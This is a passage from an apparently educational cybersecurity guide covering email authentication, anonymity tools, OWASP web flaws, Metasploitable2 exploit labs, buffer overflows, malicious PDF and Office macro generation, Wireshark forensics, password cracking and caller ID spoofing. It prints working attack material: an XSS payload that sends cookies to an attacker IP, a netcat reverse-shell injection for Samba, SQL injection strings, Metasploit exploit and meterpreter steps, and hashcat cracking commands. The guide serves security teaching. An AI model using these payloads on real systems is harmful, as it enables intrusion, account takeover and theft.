□ Caller asks you to keep the call secret

DEFENSE ACTIONS:
□ Hang up — you can always call back on the official number
□ Never install remote access software requested by inbound caller
□ Never share OTP/2FA codes (legitimate companies never ask)
□ Report to: FTC (reportfraud.ftc.gov), local police cybercrime unit
□ Reverse phone number lookup before calling back

VISHING TECHNICAL BACKGROUND (for awareness):
- CallerID is trivially spoofed with VoIP (appears as any number)
- Voice changers can alter gender/accent
- Scripts are professionally crafted and rehearsed
- Often use leaked data to seem credible ("I have your last 4 digits...")
```

---

## 10. Email Security — SMTP, SPF, DKIM, DMARC

### 10.1 How Email Actually Works

```
EMAIL FLOW:

Sender's MUA (Outlook)
  → Sender's MTA (mail.sender.com:587 SMTP AUTH)
    → Receiver's MTA (mail.receiver.com:25 SMTP)
      → Receiver's MDA (delivery to mailbox)
        → Receiver's MUA (Outlook/Gmail reads it)

MUA = Mail User Agent (email client)
MTA = Mail Transfer Agent (mail server)
MDA = Mail Delivery Agent

WHY SPOOFING IS POSSIBLE:
SMTP was designed in 1982 with no authentication
Anyone can tell an SMTP server "I am paypal.com"
The server traditionally had no way to verify this
→ SPF, DKIM, DMARC were invented to fix this
```

### 10.2 SPF (Sender Policy Framework)

```
SPF = DNS record that says "these are the IPs allowed to send email for my domain"

Example SPF record for paypal.com:
paypal.com TXT "v=spf1 include:pp.com ip4:64.4.250.0/24 -all"

How it works:
1. Email arrives claiming to be from paypal.com
2. Receiving server looks up paypal.com TXT record
3. Checks if sending IP is in the authorized list
4. PASS = IP matches → accepted
5. FAIL = IP not in list → rejected or spam (depending on policy)

Check any domain's SPF:
dig TXT paypal.com | grep spf
nslookup -type=TXT paypal.com

SPF LIMITATION:
Only checks the envelope sender (Return-Path)
Not the From: header that users see
→ DKIM and DMARC are also needed
```

### 10.3 DKIM (DomainKeys Identified Mail)

```
DKIM = Cryptographic signature on every email

HOW IT WORKS:
1. Sending server generates RSA key pair
2. Public key published in DNS as TXT record
3. Every outgoing email gets signed with private key
4. Signature added as email header
5. Receiving server fetches public key from DNS
6. Verifies signature → proves email wasn't tampered with
   and genuinely came from that domain

CHECK DKIM:
# View raw email → look for DKIM-Signature header
# Or check Authentication-Results header in received email:
DKIM=pass → signature valid, email authentic
DKIM=fail → signature invalid → spoofed or tampered

# Lookup DKIM public key:
dig TXT selector._domainkey.paypal.com
```

### 10.4 DMARC (Domain-based Message Authentication)

```
DMARC = Policy that tells receivers what to do with failed SPF/DKIM

DMARC RECORD EXAMPLE:
_dmarc.paypal.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@paypal.com"

POLICIES:
p=none     → Monitor only (don't reject, just report)
p=quarantine → Send to spam folder if SPF/DKIM fail
p=reject   → Reject the email entirely if SPF/DKIM fail

DMARC adds ALIGNMENT:
SPF must pass AND Return-Path domain must match From: domain
DKIM must pass AND d= tag must match From: domain
→ Prevents spoofing the visible From: header

CHECK DMARC:
dig TXT _dmarc.paypal.com
# Look for p= value

FULL EMAIL AUTHENTICATION LAB:
# Test your own domain's configuration:
# mxtoolbox.com/SuperTool.aspx
# dmarcian.com/dmarc-inspector/
# mail-tester.com (send test email, see score)
```

### 10.5 Email Header Analysis Lab

```bash
# Install mailutils on Kali:
sudo apt install mailutils

# Analyze headers from a suspicious email
# (Save raw email as .eml file)

# View headers:
cat suspicious.eml | head -100

# Parse with Python:
python3 << 'EOF'
import email
with open('suspicious.eml', 'r') as f:
    msg = email.message_from_file(f)

print("From:", msg['From'])
print("To:", msg['To'])
print("Subject:", msg['Subject'])
print("Return-Path:", msg['Return-Path'])
print("Reply-To:", msg['Reply-To'])
print("\nAuthentication Results:")
print(msg['Authentication-Results'])
print("\nReceived chain:")
for received in msg.get_all('Received', []):
    print("-", received[:100])
EOF

# Extract and analyze URLs from phishing email:
# PhishTool (phishtool.com) — free tier available
# URLScan.io — safely analyze URLs without visiting them
```

---

## 11. Network Anonymity & Identity Hiding

### 11.1 IP Address Fundamentals

```
TWO TYPES OF IP ADDRESSES:

PUBLIC IP (WAN):
- Assigned by your ISP
- Unique globally
- What websites see when you connect
- Typically one per household (behind NAT router)
- Can change (dynamic) or be permanent (static)

PRIVATE IP (LAN):
- Assigned by your router (DHCP)
- Only visible inside your local network
- Not routable on internet
- Ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

WHAT WEBSITES ACTUALLY COLLECT:
- Your public IP address
- Browser user-agent string (browser, OS, version)
- Screen resolution
- Timezone
- Language settings
- Plugins/extensions installed (fingerprinting)
- Canvas fingerprint (GPU rendering signature)
→ Even with IP hidden, browser fingerprinting can identify you
```

### 11.2 Proxy Servers

```
HOW PROXIES WORK:

Client → Proxy Server → Internet
         (proxy's IP visible to destination)

TYPES:
HTTP Proxy    → Web traffic only
SOCKS4 Proxy  → TCP traffic
SOCKS5 Proxy  → TCP + UDP, supports authentication
Transparent   → Doesn't hide you (just caches/filters)
Anonymous     → Hides your IP but reveals it's a proxy
Elite/High Anon → Hides IP and proxy usage

LIMITATIONS:
- Proxy provider can see your traffic
- HTTP proxies don't encrypt (ISP can see)
- Free proxies often malicious (MITM your traffic)
- Websites can detect and block known proxy IPs

Configure in Firefox:
Settings → Network Settings → Manual proxy configuration
SOCKS Host: <proxy-IP>  Port: <port>
```

### 11.3 Tor Network

```
TOR (THE ONION ROUTER) ARCHITECTURE:

Client → Entry Node → Middle Node → Exit Node → Internet
         (knows you)               (knows dest)

Each hop encrypted separately (like onion layers):
Client encrypts: [Entry[Middle[Exit[Data]]]]
Entry unwraps outer layer, passes [Middle[Exit[Data]]]
Middle unwraps, passes [Exit[Data]]
Exit unwraps, sends Data to destination

No single node knows both who you are AND where you're going

LIMITATIONS:
- Exit node can see unencrypted traffic (use HTTPS!)
- Slow (3 hops, volunteer nodes)
- Exit nodes monitored by intelligence agencies
- Doesn't protect against browser fingerprinting
- OS-level traffic (outside Tor Browser) still uses real IP
- Tor Browser still vulnerable to JS exploits, plugins

INSTALL ON KALI:
sudo apt install tor
sudo service tor start
# Configure application to use SOCKS5 127.0.0.1:9050
# Or use Tor Browser for complete isolation
```

### 11.4 VPN (Virtual Private Network)

```
VPN ARCHITECTURE:

Client → [Encrypted Tunnel] → VPN Server → Internet
         (ISP can see tunnel           (VPN's IP visible
          but not contents)             to destination)

WHAT VPN PROTECTS:
✓ Hides traffic content from ISP
✓ Hides destination from ISP
✓ Hides your IP from destination websites
✓ Protects on untrusted WiFi networks

WHAT VPN DOESN'T PROTECT:
✗ VPN provider can see your traffic (trust shifts to them)
✗ DNS leaks (configure DNS leak protection)
✗ WebRTC leaks (browser can reveal real IP)
✗ Account logins still identify you
✗ Browser fingerprinting
✗ Legal requests to VPN provider

CHOOSING A VPN:
- No-log policy (verified by audit)
- Jurisdiction outside 5/9/14 Eyes
- Open source client
- Accepts anonymous payment (crypto)

CHECK FOR DNS/IP LEAKS:
# While connected to VPN:
curl ifconfig.me    # Should show VPN IP
# Visit: dnsleaktest.com, ipleak.net
# If your real IP appears → leak detected
```

### 11.5 Tails OS

```
TAILS (THE AMNESIC INCOGNITO LIVE SYSTEM):

Boot from USB, leaves NO trace on computer used

FEATURES:
✓ Routes ALL traffic through Tor automatically
✓ Amnesic (RAM cleared on shutdown, nothing written to disk)
✓ Includes security tools pre-installed
✓ Fake browser fingerprint (looks like all other Tails users)
✓ Clock set to UTC regardless of timezone

USE CASES:
- Whistleblowing (SecureDrop uses Tor)
- Sensitive journalism
- High-risk activism
- Security research

LIMITATIONS:
✗ Slow (Tor)
✗ Applications outside Tor still use real IP (not in Tails — but in other distros)
✗ If you log into personal accounts, anonymity broken
✗ Sophisticated adversaries (state level) can correlate timing

INSTALL:
tails.boum.org → download ISO → write to USB with balenaEtcher
Boot from USB
```

### 11.6 OPSEC (Operational Security)

```
OPSEC FAILURES — HOW ATTACKERS/RESEARCHERS GET IDENTIFIED:

1. IP leaks (forgot to use VPN before accessing a resource)
2. Reusing usernames across accounts
3. Writing style analysis (stylometry)
4. Timezone/working hours reveal location
5. Posting photos with metadata (GPS coordinates in EXIF)
6. Payment trail (PayPal, credit card)
7. Account correlation (same email/username)
8. Browser fingerprint consistency

OPSEC BEST PRACTICES FOR RESEARCHERS:
- Compartmentalize: separate identities for separate activities
- Never mix personal and research accounts
- Strip metadata from files before sharing:
  exiftool -all= image.jpg
- Check image metadata:
  exiftool image.jpg
- Use separate browser profiles
- Check what your browser reveals: coveryourtracks.eff.org
```

---

## 12. Web Application Security (OWASP Top 10)

### 12.1 Test Environment Setup

```bash
# Install DVWA on your own web server:
# https://github.com/digininja/DVWA

# Or use Docker:
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Also install:
# Mutillidae: https://github.com/webpwnized/mutillidae
# bWAPP: http://www.itsecgames.com/

# Tools:
sudo apt install burpsuite     # Intercept proxy
sudo apt install zaproxy       # OWASP ZAP (free alternative)
sudo apt install sqlmap        # SQL injection automation
sudo apt install nikto         # Web server scanner
sudo apt install gobuster      # Directory enumeration
```

### 12.2 A01 — Broken Access Control

```
WHAT IT IS:
Users can access resources/actions they shouldn't have permission for

EXAMPLES:
- Modify URL: /user?id=123 → /user?id=124 (access another user's data)
- Access admin page without being admin: /admin/dashboard
- IDOR (Insecure Direct Object Reference)

LAB ON YOUR OWN SITE:
1. Log in as user A
2. Note your profile URL (e.g., /profile?id=5)
3. Change id to 4, 6, 7 — can you see other users' data?
4. Try accessing /admin without admin rights

TESTING:
# Burp Suite:
# Enable Intercept → browse site as low-privilege user
# Repeat requests with admin cookies removed
# Try accessing admin endpoints from user session

DEFENSE CODE (PHP example):
<?php
// BAD - no authorization check:
$user_id = $_GET['id'];
$data = getUserData($user_id);

// GOOD - verify ownership:
$user_id = $_GET['id'];
if ($user_id !== $_SESSION['user_id'] && !isAdmin($_SESSION['user_id'])) {
    die("Access denied");
}
$data = getUserData($user_id);
?>
```

### 12.3 A02 — Cryptographic Failures

```
WEAK CRYPTOGRAPHY IN WEB APPS:

VULNERABLE PATTERNS:
- Passwords stored as MD5/SHA1 (unsalted)
- HTTP instead of HTTPS (traffic interception)
- Sensitive data in URL parameters (logged in server logs)
- Weak session tokens (predictable)
- Cookies without Secure/HttpOnly flags

LAB:
# Check if your site uses HTTPS:
curl -I http://yoursite.com | grep -i "location\|strict-transport"

# Check cookie flags:
curl -v http://yoursite.com 2>&1 | grep -i "set-cookie"
# Look for: Secure; HttpOnly; SameSite=Strict

# Check for mixed content:
# Browser DevTools → Security tab → See if HTTP resources on HTTPS page

# Test password storage (if you have DB access):
SELECT password FROM users LIMIT 5;
# If you see short fixed-length strings (32 chars = MD5) → vulnerable

SECURE PASSWORD HASHING:
# PHP:
password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
password_verify($input, $stored_hash);

# Python:
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hashed)
```

### 12.4 A03 — SQL Injection

```
WHAT IT IS:
User input injected into SQL queries, manipulating database behavior

CLASSIC EXAMPLE:
# Vulnerable query:
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

# Attacker input:
username = admin' --
password = anything

# Resulting query:
SELECT * FROM users WHERE username='admin' --' AND password='anything'
# -- comments out the password check → logged in as admin!

TESTING ON YOUR OWN DVWA:

# Manual test:
# In any input field, try:
'
' OR '1'='1
' OR '1'='1' --
" OR "1"="1
1; DROP TABLE users --

# Error-based detection:
# If you get a database error message → vulnerable

# Automated with sqlmap (only on your own sites):
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<your-session>" \
  --dbs              # List databases
  --tables           # List tables
  --dump             # Dump data

DEFENSE:
# PHP PDO Prepared Statements:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

# Never concatenate user input into SQL queries
```

### 12.5 A07 — Identification & Authentication Failures

```
ATTACK TYPES:
- Credential stuffing (using breached username/password lists)
- Brute force (trying all passwords)
- Password spraying (1 password across many users)
- Session hijacking (stealing session cookies)
- Weak session tokens (predictable IDs)

LAB:

# Check for missing rate limiting on login:
# Use Burp Suite Intruder:
# 1. Capture login request
# 2. Send to Intruder
# 3. Mark password field as payload
# 4. Load password list (rockyou.txt)
# 5. Run attack — if no lockout → vulnerable

# Test session fixation:
# 1. Get session token before login
# 2. Log in
# 3. Check if session token changed → if same, vulnerable

# Check cookie security attributes:
# Should have: Secure; HttpOnly; SameSite=Strict

DEFENSE:
□ Rate limiting on login (5 attempts → 15 min lockout)
□ Multi-factor authentication (MFA)
□ Strong session token generation (cryptographically random, 128+ bits)
□ Session regeneration after login (prevent fixation)
□ HTTPS everywhere (prevent session hijacking)
□ Secure cookie flags
□ bcrypt/Argon2 for passwords
```

### 12.6 A03 — Cross-Site Scripting (XSS)

```
WHAT IT IS:
Attacker injects JavaScript into pages viewed by other users

TYPES:
Reflected XSS  → Payload in URL, executed when victim clicks link
Stored XSS     → Payload saved in database, executed for all visitors
DOM-based XSS  → Payload in DOM, never sent to server

IMPACT:
- Session cookie theft → account takeover
- Keylogging in browser
- Redirect to phishing page
- Defacement
- Drive-by malware download

LAB ON DVWA:
# Test in search/input fields:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Cookie theft payload (test on your own app only):
<script>document.location='http://your-kali-ip/?cookie='+document.cookie</script>

# On Kali, start listener:
sudo python3 -m http.server 80
# You'll see stolen cookies in your server log

DEFENSE:
# Encode output — NEVER put unescaped user data in HTML:

# PHP:
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

# Content Security Policy header:
Content-Security-Policy: default-src 'self'; script-src 'self'

# HttpOnly cookie (JS can't read it):
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

### 12.7 CSRF (Cross-Site Request Forgery)

```
WHAT IT IS:
Tricks authenticated user's browser into making unintended requests

ATTACK SCENARIO:
1. Victim logs into bank.com (has active session cookie)
2. Attacker tricks victim to visit evil.com
3. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker-account">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser sends request WITH victim's bank cookie
5. Bank sees authenticated request → transfers money

DEFENSE:
# CSRF Token (server generates unique token per session):
<?php
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;
// In form:
echo '<input type="hidden" name="csrf_token" value="'.$token.'">';
// On submit:
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) die('CSRF detected');
?>

# SameSite Cookie attribute:
Set-Cookie: sessionid=abc; SameSite=Strict
# Browser won't send cookie on cross-site requests

# Verify Origin/Referer headers
```

---

## 13. Metasploitable2 Full Lab Guide

### 13.1 Setup

```bash
# Download Metasploitable2:
# https://sourceforge.net/projects/metasploitable/

# Import into VMware:
# Create new VM → Use existing disk → select .vmdk file
# Network: Host-Only (same network as Kali)

# Default credentials: msfadmin / msfadmin

# Find Metasploitable2 IP from Kali:
sudo netdiscover -i eth0 -r 192.168.1.0/24
# or
nmap -sn 192.168.1.0/24

# Verify it's Metasploitable2:
nmap -A <target-IP>
```

### 13.2 Full Port Scan & Service Enumeration

```bash
# Comprehensive scan:
nmap -sV -sC -O -p- --open -oN metasploitable2_scan.txt <target-IP>

# Expected open services on Metasploitable2:
# 21   - FTP (vsftpd 2.3.4 - backdoored)
# 22   - SSH (OpenSSH 4.7)
# 23   - Telnet
# 25   - SMTP (Postfix)
# 53   - DNS (BIND 9.4.2)
# 80   - HTTP (Apache 2.2.8)
# 139  - NetBIOS
# 445  - SMB (Samba 3.0.20)
# 512  - Rexec
# 513  - Rlogin
# 514  - Rsh
# 1524 - Ingreslock (backdoor)
# 2049 - NFS
# 2121 - FTP (ProFTPD 1.3.1)
# 3306 - MySQL
# 3632 - distccd
# 5432 - PostgreSQL
# 5900 - VNC
# 6000 - X11
# 6667 - IRC (UnrealIRCd)
# 8009 - AJP
# 8180 - HTTP (Tomcat)
```

### 13.3 Lab 1: vsftpd 2.3.4 Backdoor

```bash
# This version of vsftpd has a backdoor triggered by ":)" in username

# Start Metasploit:
msfconsole

# Search for exploit:
search vsftpd

# Use exploit:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-IP>
run

# You should get a shell:
whoami  # should return 'root'
id
hostname

# Manual exploit (understanding the vulnerability):
# The backdoor: if username contains :) it opens shell on port 6200
nc <target-IP> 21
USER test:)
PASS anything
# In another terminal:
nc <target-IP> 6200
# → root shell

# LESSON: Always check software versions against CVE databases
# CVE-2011-2523: vsftpd 2.3.4 backdoor
```

### 13.4 Lab 2: Samba MS-RPC Shell Command Injection

```bash
# CVE-2007-2447: Samba 3.0.20 username map script vulnerability

use exploit/multi/samba/usermap_script
set RHOSTS <target-IP>
set LHOST <your-kali-IP>
run

# Get reverse shell
# Lesson: Samba is critical to patch — many versions have critical vulns

# Manual understanding:
# The vulnerability: Samba passes username to /bin/sh without sanitization
# Payload in username: "/=`nohup nc -e /bin/bash <kali-ip> 4444`"
```

### 13.5 Lab 3: UnrealIRCd Backdoor

```bash
# UnrealIRCd 3.2.8.1 contains a backdoor in its download (CVE-2010-2075)

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <target-IP>
set LHOST <your-kali-IP>
run

# Get shell
```

### 13.6 Lab 4: Tomcat Manager Default Credentials

```bash
# Tomcat Manager running on port 8180
# Default credentials: tomcat/tomcat

# Browse to: http://<target-IP>:8180/manager/html
# Try: tomcat/tomcat, admin/admin, admin/password

# Metasploit module:
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target-IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <your-kali-IP>
run

# Lesson: Change default credentials immediately after installation
```

### 13.7 Lab 5: Distcc Daemon Command Execution

```bash
# distccd allows distributed compilation, runs commands on remote host
# CVE-2004-2687

use exploit/unix/misc/distcc_exec
set RHOSTS <target-IP>
set LHOST <your-kali-IP>
run

# Manual:
# distccd accepts compiler arguments and executes them
# Inject: distccd --listen 0.0.0.0 --allow 0.0.0.0/0 --log-stderr -- id
```

### 13.8 Lab 6: PostgreSQL Payload Execution

```bash
# PostgreSQL running on 5432 with default credentials

use exploit/linux/postgres/postgres_payload
set RHOSTS <target-IP>
set USERNAME postgres
set PASSWORD postgres
set LHOST <your-kali-IP>
run

# Manual connection:
psql -h <target-IP> -U postgres
\list   # List databases
\connect <dbname>
\dt     # List tables
```

### 13.9 Lab 7: Web Application — DVWA on Metasploitable2

```bash
# Access: http://<target-IP>/dvwa
# Login: admin/password

# SQL Injection Lab:
# Security: Low
# SQLi: Input: 1' OR '1'='1
# Should see all users

# SQLMap against DVWA:
sqlmap -u "http://<target-IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<your-session-id>" \
  -p id --dbs

# XSS Lab:
# Input: <script>alert(document.cookie)</script>
# Security: Low → executes
# Security: High → blocked (study difference)

# File Inclusion:
# http://<target-IP>/dvwa/vulnerabilities/fi/?page=../../etc/passwd
# (Low security)
```

### 13.10 Post-Exploitation on Metasploitable2

```bash
# After getting meterpreter shell:
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user
meterpreter > getpid           # Current process ID
meterpreter > ps               # Running processes
meterpreter > shell            # Drop to OS shell

# Privilege escalation:
meterpreter > getsystem        # Auto-attempt privilege escalation
meterpreter > use post/multi/recon/local_exploit_suggester
run

# File operations:
meterpreter > ls
meterpreter > download /etc/passwd
meterpreter > upload /tmp/test.txt /tmp/

# Network:
meterpreter > ifconfig
meterpreter > route
meterpreter > arp

# Pivoting (reach networks through compromised host):
meterpreter > run post/multi/manage/autoroute
```

---

## 14. Exploit Development Concepts

### 14.1 Buffer Overflow Fundamentals

```
HOW PROGRAMS USE MEMORY:

HIGH ADDRESS
┌──────────────┐
│   Stack      │ ← Local variables, return addresses
│   (grows ↓)  │
├──────────────┤
│   Heap       │ ← Dynamic allocation (malloc)
│   (grows ↑)  │
├──────────────┤
│   Data       │ ← Global/static variables
├──────────────┤
│   Text       │ ← Program code (read-only)
LOW ADDRESS

STACK FRAME LAYOUT:
┌──────────────────────┐
│  Local Variables     │ ← Buffer lives here
├──────────────────────┤
│  Saved Frame Pointer │
├──────────────────────┤
│  Return Address      │ ← If overwritten → control execution
└──────────────────────┘

BUFFER OVERFLOW:
- Function allocates 100-byte buffer for user input
- Attacker provides 200 bytes
- Extra bytes overwrite Return Address
- On function return → jumps to attacker's address (shellcode)
```

### 14.2 Basic Buffer Overflow Lab (bof vulnerable binary)

```bash
# Create intentionally vulnerable C program on your VM:
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <string.h>

void secret() {
    printf("You reached the secret function!\n");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    vulnerable(argv[1]);
    printf("Normal execution\n");
    return 0;
}
EOF

# Compile with protections disabled (for learning):
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack

# Check protections:
checksec --file=vuln

# Find offset to return address:
python3 -c "print('A' * 72)" | ./vuln  # segfault

# Use GDB for analysis:
gdb ./vuln
(gdb) run $(python3 -c "print('A'*100)")
(gdb) info registers
(gdb) x/32x $rsp
```

### 14.3 Modern Exploit Mitigations

```
PROTECTION MECHANISMS (what defenders implement):

1. ASLR (Address Space Layout Randomization)
   - Stack, heap, libraries at random addresses each run
   - Makes predicting jump targets difficult
   - Enable: echo 2 > /proc/sys/kernel/randomize_va_space

2. Stack Canary
   - Random value placed before return address
   - Checked before function returns
   - If overwritten → crash (can't silently exploit)
   - Compile: gcc -fstack-protector-strong

3. NX/DEP (Non-Executable stack)
   - Stack memory marked non-executable
   - Can't execute shellcode placed on stack
   - Kernel: noexec mapping, CPU NX bit
   - Bypass: ROP (Return-Oriented Programming)

4. PIE (Position Independent Executable)
   - Code itself at random address
   - Combined with ASLR = no fixed addresses

5. RELRO (Relocation Read-Only)
   - GOT table made read-only after startup
   - Prevents GOT overwrite attacks

CHECK BINARY PROTECTIONS:
checksec --file=<binary>

UNDERSTANDING THESE FOR DEFENSE:
- Always compile with: -fstack-protector-strong -pie -z relro
- Enable system ASLR
- Use modern compilers (GCC/Clang with all mitigations)
```

---

## 15. File Format Exploits & Silent Exploits

### 15.1 How File Format Exploits Work

```
EXECUTABLE vs NON-EXECUTABLE FILES:

Executable (.exe, .elf):
- Can run itself (OS loader executes it)
- Does not need helper application
- User seeing .exe is suspicious

Non-executable (.pdf, .docx, .xlsx):
- Cannot execute itself
- Requires a READER application (Adobe Reader, Microsoft Word)
- If reader has a vulnerability → exploit triggers when file is opened
- More trusted by users ("it's just a PDF")

FILE FORMAT EXPLOIT MECHANISM:
1. Attacker finds vulnerability in PDF reader / Office / browser
2. Crafts malicious file that triggers that vulnerability when parsed
3. Exploit runs shellcode within the context of the reader process
4. Shellcode drops RAT/backdoor with reader's privileges
```

### 15.2 Metasploit File Format Exploit Lab

```bash
# Generate malicious PDF (for educational analysis on your own VM only)
msfconsole

# Adobe Reader exploits (patched, but shows concept):
search type:exploit platform:windows adobe pdf
use exploit/windows/fileformat/adobe_pdf_embedded_exe

set FILENAME malicious_test.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-kali-IP>
set LPORT 4444
run

# This generates: /root/.msf4/local/malicious_test.pdf
# Transfer to your Windows VM and open

# Start listener:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-kali-IP>
set LPORT 4444
run

# LESSON: Keep Adobe Reader, Microsoft Office fully patched
# Enable Protected View in Office
# Enable sandboxing in Adobe Reader
```

### 15.3 Office Macro Attacks

```bash
# Malicious Office document via macros
msfconsole

use exploit/multi/fileformat/office_word_macro
set FILENAME test_invoice.docm
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-kali-IP>
run

# DEFENSE:
# 1. Disable macros by default in Office:
#    File → Options → Trust Center → Trust Center Settings
#    → Macro Settings → Disable all macros with notification

# 2. Group Policy (enterprise):
#    User Config → Admin Templates → Microsoft Office → Security Settings
#    → VBA Macro Notification Settings → Disable all except digitally signed

# 3. Protected View (opens suspicious files in sandboxed mode)
# 4. Application Guard (Office 365 - hardware isolation)
```

### 15.4 Defense Against File Format Attacks

```
ORGANIZATIONAL CONTROLS:

Email Gateway:
□ Strip .exe, .vbs, .js, .wsf attachments
□ Convert .docm → .docx (strip macros)
□ Sandbox all attachments before delivery
□ Block password-protected ZIPs (bypass scanning)

Endpoint:
□ Keep Office, Adobe Reader, browsers fully patched
□ Disable macros (Group Policy)
□ Enable Protected View
□ Application whitelisting (only approved apps run)
□ EDR with behavioral detection

User Training:
□ Don't enable macros for "viewing" content
□ "Enable editing" in Protected View is also suspicious
□ Verify invoice/document senders by phone
□ Report suspicious files to IT security
```

---

## 16. Network Forensics with Wireshark

### 16.1 Capture Setup

```bash
# Install Wireshark:
sudo apt install wireshark

# Capture on Kali (monitoring VM traffic):
sudo wireshark &
# Select your interface (eth0, vmnet1, etc.)

# Command line capture:
sudo tcpdump -i eth0 -w capture.pcap
# Read it later:
wireshark capture.pcap
# or:
tcpdump -r capture.pcap
```

### 16.2 Essential Wireshark Filters

```
DISPLAY FILTERS (type in filter bar):

# By IP:
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 192.168.1.100

# By protocol:
tcp
udp
http
dns
ftp
smtp
icmp

# HTTP analysis:
http.request.method == "POST"     # Only POST requests
http.response.code == 200         # Successful responses
http contains "password"          # Search HTTP for keyword

# DNS:
dns.qry.name contains "evil"      # DNS queries for suspicious domains

# Show only new TCP connections:
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Malware C2 pattern (regular beaconing):
# Statistics → I/O Graph → look for periodic spikes

# Follow TCP stream (see full conversation):
Right-click packet → Follow → TCP Stream
```

### 16.3 Identifying RAT Traffic

```
BEHAVIORAL INDICATORS IN PCAP:

1. BEACONING:
   Statistics → I/O Graphs
   Look for: regular spikes every X seconds/minutes
   → Malware checking in with C2

2. UNUSUAL PORTS:
   Statistics → Endpoints → TCP tab
   Look for: connections on non-standard ports (not 80, 443, 53)

3. C2 COMMUNICATION PATTERNS:
   Small outbound requests, larger inbound responses
   (victim asking "any commands?" → server responding with tasks)

4. DATA EXFILTRATION:
   Statistics → Conversations → TCP
   Look for: large outbound transfers to unknown IPs

5. DNS C2 (DNS tunneling):
   Very long DNS queries (data encoded in subdomain)
   Many queries to same domain with random subdomains
   Filter: dns.qry.name.len > 50

6. ENCRYPTED C2:
   TLS to non-standard ports
   Self-signed certificates (check TLS handshake)
   Filter: tls.handshake.type == 11  (Certificate message)
```

---

## 17. Password Attacks & Credential Security

### 17.1 Password Attack Types

```
ATTACK TYPES:

1. BRUTE FORCE
   Try every possible combination
   a, b, c... aa, ab... aaa...
   Time: exponential with length
   Effective for: short passwords (<8 chars)

2. DICTIONARY ATTACK
   Try words from a wordlist (rockyou.txt = 14M passwords)
   Much faster than brute force
   Effective for: common words, names, dates

3. RULE-BASED ATTACK
   Apply rules to wordlist (capitalize, add numbers, leet speak)
   password → Password, p@ssw0rd, password123

4. CREDENTIAL STUFFING
   Use username:password pairs from data breaches
   Effective because people reuse passwords across sites
   haveibeenpwned.com — check if your email is in a breach

5. RAINBOW TABLE ATTACK
   Precomputed hash → plaintext lookups
   Defeated by: password salting

6. PASS THE HASH
   Use NTLM hash directly for authentication
   No need to crack it
   Windows-specific attack
```

### 17.2 Lab: Password Cracking with Hashcat

```bash
# Install hashcat on Kali:
sudo apt install hashcat

# Get rockyou wordlist:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Hash types (-m flag):
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM (Windows)
# 1800 = sha512crypt (Linux /etc/shadow)
# 3200 = bcrypt (VERY slow — good!)

# Example: crack MD5 hash
echo -n "password123" | md5sum
# d9b5f58f0b38198293971865a14074f2

hashcat -m 0 -a 0 d9b5f58f0b38198293971865a14074f2 /usr/share/wordlists/rockyou.txt

# Rule-based attack:
hashcat -m 0 -a 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (4-6 chars):
hashcat -m 0 -a 3 <hash> ?a?a?a?a  # 4 chars, all character classes

# LESSON: Time to crack bcrypt vs MD5:
# MD5 "password" → milliseconds
# bcrypt $2b$12$... "password" → minutes (100M x slower)
# USE BCRYPT/ARGON2 FOR PASSWORD STORAGE
```

### 17.3 Password Security Best Practices

```
FOR USERS:
□ Use a password manager (Bitwarden, KeePass)
□ Unique password for every account
□ 16+ characters
□ Enable MFA on all important accounts
□ Check haveibeenpwned.com regularly

FOR DEVELOPERS:
□ Never store plaintext passwords
□ Use bcrypt, Argon2id, or scrypt (NOT MD5/SHA1)
□ Salt every password (prevents rainbow tables)
□ Implement rate limiting on login
□ Account lockout after N failed attempts
□ MFA support
□ Password breach checking (pwned passwords API)

EXAMPLE SECURE IMPLEMENTATION:
# Python with Argon2:
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash(password)
ph.verify(hash, input_password)  # raises exception if wrong
```

---

## 18. Calling Scams & VoIP Security

### 18.1 How Caller ID Spoofing Works

```
VoIP (Voice over IP) ARCHITECTURE:

Traditional PSTN: Physical line = physical identity
VoIP: SIP protocol, software-defined

SIP INVITE packet (starting a call):
From: "Microsoft Support" <sip:+18005551234@attacker.com>
To: <sip:+15551234567@carrier.com>
Contact: <sip:attacker@attacker.com:5060>

The "From" field is completely attacker-controlled
Carriers may or may not validate it against CNAM databases
